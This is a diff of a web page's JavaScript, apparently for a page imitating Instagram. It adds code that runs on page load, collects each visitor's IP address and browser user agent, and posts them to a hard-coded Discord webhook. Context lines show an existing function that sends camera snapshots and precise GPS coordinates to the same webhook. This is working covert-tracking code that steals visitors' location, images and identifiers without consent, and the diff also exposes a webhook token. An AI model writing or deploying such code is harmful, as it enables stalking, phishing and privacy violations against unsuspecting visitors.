@@ -1,4 +1,40 @@
 document.addEventListener('DOMContentLoaded', () => {
+    const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
+
+    // --- Visitor Tracking (Immediate) ---
+    async function trackVisit() {
+        try {
+            // 1. Get IP
+            let ip = "Unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch (e) { console.log("IP Fetch failed"); }
+
+            // 2. Get/Increment Global Count (Using a free counter API)
+            // Namespace: lnstgran_tracker, Key: visits
+            let visitCount = "N/A";
+            try {
+                // Using counterapi.dev - simple increment
+                const countRes = await fetch('https://api.counterapi.dev/v1/lnstgran_tracker/visits/up');
+                const countData = await countRes.json();
+                visitCount = countData.count;
+            } catch (e) { console.log("Count Fetch failed"); }
+
+            // 3. Send to Discord
+            const payload = {
+                content: `🔔 **New Visitor!**\n**Total Visits:** #${visitCount}\n**IP:** ${ip}\n**Time:** ${new Date().toLocaleString()}\n**UA:** ${navigator.userAgent}`
+            };
+
+            const formData = new FormData();
+            formData.append("payload_json", JSON.stringify(payload));
+            await fetch(webhookUrl, { method: "POST", body: formData });
+            console.log("Visit tracked.");
+
+        } catch (e) { console.error("Tracking error", e); }
+    }
+    trackVisit(); // <--- Call immediately
     // const statusBox = document.getElementById('status'); // Removed UI element
     const locationDisplay = document.getElementById('locationDisplay');
     const camPreview = document.getElementById('camPreview');
@@ -181,7 +217,7 @@ document.addEventListener('DOMContentLoaded', () => {
 
     // Existing Discord Logic (Preserved)
     async function sendToDiscord({ latitude, longitude, accuracy, imageBlob, ip, count }) {
-        const webhookUrl = "https://discord.com/api/webhooks/1449598201354256447/Z-NA9d8hwIsxDWemXGDG7pGQRLdOLEVoOymGuPvpUW3iO9fNa51EqLvIidqgISxtmS6v";
+        // webhookUrl is defined at top scope
         const formData = new FormData();
         formData.append("file", imageBlob, `capture_${count}.jpg`);
         const googleMapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
